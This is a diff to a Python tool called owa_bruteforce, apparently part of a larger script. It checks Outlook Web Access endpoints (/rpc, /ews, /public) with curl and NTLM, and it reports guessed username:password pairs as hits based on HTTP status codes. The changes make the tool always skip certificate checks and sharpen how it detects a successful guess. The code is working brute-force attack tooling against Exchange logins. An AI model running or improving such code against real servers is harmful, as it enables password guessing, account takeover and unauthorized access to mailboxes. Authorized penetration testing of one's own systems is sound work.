@@ -43,14 +43,14 @@ class owa_bruteforce():
 			# print(httpquestion) # SET AS A VERBOSE OPTION
 			logging.info(httpquestion)
 
-		def cert_verification_failed(self, host):
-			logging.info('====Certificate Verification failed====')
-			logging.info('====Using -k to Disregard Certificate====')
-			httpquestion_raw = subprocess.check_output(['curl', '-I', '-k', '-ntlm', host], stderr=subprocess.PIPE)
-			httpquestion = httpquestion_raw.decode(encoding='utf-8')
-			# print(httpquestion) # Set as a verbose option
-			disp_check_result(self, httpquestion)
-			# print('++++++++++++++++++++++++++++++++++++++++')
+		# def cert_verification_failed(self, host):
+		# 	logging.info('====Certificate Verification failed====')
+		# 	logging.info('====Using -k to Disregard Certificate====')
+		# 	httpquestion_raw = subprocess.check_output(['curl', '-I', '-k', '-ntlm', host], stderr=subprocess.PIPE)
+		# 	httpquestion = httpquestion_raw.decode(encoding='utf-8')
+		# 	# print(httpquestion) # Set as a verbose option
+		# 	disp_check_result(self, httpquestion)
+		# 	# print('++++++++++++++++++++++++++++++++++++++++')
 
 		def check(self):
 			print('Checking for /rpc, /ews and /public...')
@@ -58,14 +58,9 @@ class owa_bruteforce():
 			for self.list_position in range(3):
 				try:
 					host = "https://" + self.address + "/" + self.list[self.list_position]
-					httpresponse_raw = subprocess.check_output(['curl', '-I', '-ntlm', host], stderr=subprocess.PIPE)
+					httpresponse_raw = subprocess.check_output(['curl', '-I', '-k', '-ntlm', host], stderr=subprocess.PIPE)
 					httpresponse = httpresponse_raw.decode(encoding='utf-8')
 					disp_check_result(self, httpresponse)
-				except subprocess.CalledProcessError as error:
-					# print(error.returncode)
-					# print(self.list[self.list_position])
-					if error.returncode == 60:
-						cert_verification_failed(self, host)
 				except:
 					print('Unexpected Error:', sys.exc_info())
 					raise SystemExit
@@ -108,19 +103,19 @@ class owa_bruteforce():
 		return clean
 
 	def disp_attempt_guess(self, user, passw, httpresponse, protocol):
-		if "404" in httpresponse and protocol == 'rpc':
+		if "404 Not Found" in httpresponse and protocol == 'rpc':
 			print('\033[92m'+'[+]'+'\033[0m'+'{}:{}'.format(user, passw))
 			answer = '[+] {}:{}'.format(user, passw)
 			logging.info(httpresponse)
 			logging.info(answer)
 			return answer
-		elif "500" in httpresponse and protocol == 'ews':
+		elif "500 Internal Server Error" in httpresponse and protocol == 'ews':
 			print('\033[92m'+'[+]'+'\033[0m'+'{}:{}'.format(user, passw))
 			answer = '[+] {}:{}'.format(user, passw)
 			logging.info(httpresponse)
 			logging.info(answer)
 			return answer
-		elif "404" in httpresponse and protocol == 'public':
+		elif "404 Not Found" in httpresponse and protocol == 'public':
 			print('\033[92m'+'[+]'+'\033[0m'+'{}:{}'.format(user, passw))
 			answer = '[+] {}:{}'.format(user, passw)
 			logging.info(httpresponse)
